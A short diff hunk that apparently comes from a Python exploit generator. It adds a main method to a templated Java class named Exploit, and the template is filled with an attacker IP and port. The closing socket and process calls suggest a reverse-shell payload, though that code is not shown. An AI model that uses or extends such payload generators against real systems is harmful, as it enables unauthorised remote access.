@@ -50,6 +50,16 @@ public class Exploit {
         p.destroy();
         s.close();
     }
+    public static void main(String[] args) {
+        try {
+            System.out.println("[DEBUG] Exploit started.");
+            new Exploit(); // Instantiating the Exploit class
+            System.out.println("[DEBUG] Exploit Done.");
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
 }
 """ % (userip, lport)
 
